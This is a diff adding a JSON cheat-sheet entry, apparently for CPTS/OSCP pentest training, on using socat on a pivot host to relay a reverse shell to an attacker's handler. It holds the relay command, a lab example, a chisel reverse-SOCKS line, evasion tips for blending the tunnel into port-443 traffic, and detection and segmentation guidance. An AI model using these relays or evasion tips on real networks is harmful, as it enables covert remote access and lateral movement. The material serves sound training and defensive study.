@@ -1,0 +1,79 @@
+{
+  "id": "socat-reverse-redirect",
+  "name": "Socat - Reverse Shell Redirector",
+  "command": "socat TCP4-LISTEN:<listen_port>,fork TCP4:<attacker_ip>:<handler_port>",
+  "description": "Runs on the pivot to relay an inbound reverse shell to your handler: the payload connects to the pivot on <listen_port> and socat forwards it to the attack host. fork lets it handle multiple connections. Point the payload's LHOST at the pivot.",
+  "platform": "linux",
+  "requires": [
+    "shell"
+  ],
+  "protocols": [
+    "tcp"
+  ],
+  "tools": [
+    "socat"
+  ],
+  "tags": [
+    "socat",
+    "redirector",
+    "reverse-shell",
+    "pivoting"
+  ],
+  "category": "Pivoting & Tunneling",
+  "subcategory": "Socat Redirection",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 12: Pivoting, Tunneling, and Port Forwarding",
+  "examples": [
+    {
+      "label": "socat redirector",
+      "command": "socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80"
+    }
+  ],
+  "notes": "Payload uses the pivot IP as LHOST; the MSF handler listens on the attack host at <handler_port>.",
+  "references": [
+    {
+      "title": "HTB Academy - Pivoting, Tunneling, and Port Forwarding",
+      "url": "https://academy.hackthebox.com/module/details/158"
+    },
+    {
+      "title": "socat",
+      "url": "https://linux.die.net/man/1/socat"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "proxychains-run",
+      "note": "Send tools through the redirected proxy chain.",
+      "rel": "next"
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1090.001"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "socat reverse redirection has the pivot connect OUT to the attacker and relay to an internal service - useful when inbound to the pivot is blocked.",
+    "prerequisites": "socat on the pivot with outbound access to the attacker.",
+    "impact": "An outbound-initiated relay bringing an internal service to the attacker (bypasses inbound firewalling).",
+    "detection": "[MITRE T1090.001] A compromised host relaying traffic between segments it shouldn't bridge; an unexpected listening port (SOCKS/forwarder) on the pivot; the pivot initiating connections to hosts/ports it never normally contacts; lateral flows that appear to originate from the pivot (NetFlow/east-west monitoring).",
+    "artifacts": "A socat process making an outbound connection; the relayed internal traffic.",
+    "prevention": "[MITRE T1090.001 M1030 Network Segmentation] strict east-west firewall rules so one foothold can't reach other segments; egress filtering; IDS/IPS + NetFlow analysis for proxy patterns and long-lived flows; alert on unexpected listeners on servers.",
+    "evasion": "Tunnel over an allowed protocol/port (443) and encrypt the channel so the relay blends with normal traffic; keep the listener on a common-looking port.",
+    "sources": [
+      "HTB M12",
+      "MITRE T1090.001"
+    ],
+    "misconfiguration": "The network lacks proper segmentation — a compromised DMZ host has direct layer-3 reachability to internal infrastructure (database servers, DCs, internal admin panels). No egress filtering blocks outbound HTTP/HTTPS connections to arbitrary hosts, allowing C2 channels and reverse tunnels. Internal firewalls only filter inbound traffic, not east-west or outbound.",
+    "vulnerable_config": "# Network design: flat Layer-3 network, all VLANs can reach each other\n# DMZ web server can ping/connect to: 10.10.10.0/24 (internal LAN), 10.10.20.0/24 (DB subnet)\n# No egress proxy — direct outbound HTTP to any IP allowed\n\n# iptables on pivot host (none blocking outbound):\niptables -L OUTPUT  # policy ACCEPT, no rules\n\n# This allows: chisel client 10.10.10.5:8080 R:socks\n# Attacker now has SOCKS5 access to the entire internal network",
+    "secure_config": "# Network segmentation with explicit allow rules:\n# DMZ -> Internet: only specific egress IPs (patch servers, DNS)\n# DMZ -> Internal: ONLY the DB ports this specific app needs\n# Internal -> Internal: segment by tier (web tier can't reach DC directly)\n\n# Egress filtering — block all outbound except known-good:\n# FortiGate / Palo Alto / iptables:\niptables -P OUTPUT DROP\niptables -A OUTPUT -d 8.8.8.8 -p udp --dport 53 -j ACCEPT  # DNS to specific server\niptables -A OUTPUT -p tcp --dport 443 -d <known_update_servers> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# IDS/IPS signatures for Chisel, ngrok, frp traffic patterns\n# DNS monitoring — detect DNS tunneling (dnscat2) via unusual query frequency/length\n# HTTP proxy with TLS inspection — detect reverse tunnels in HTTPS streams"
+  }
+}
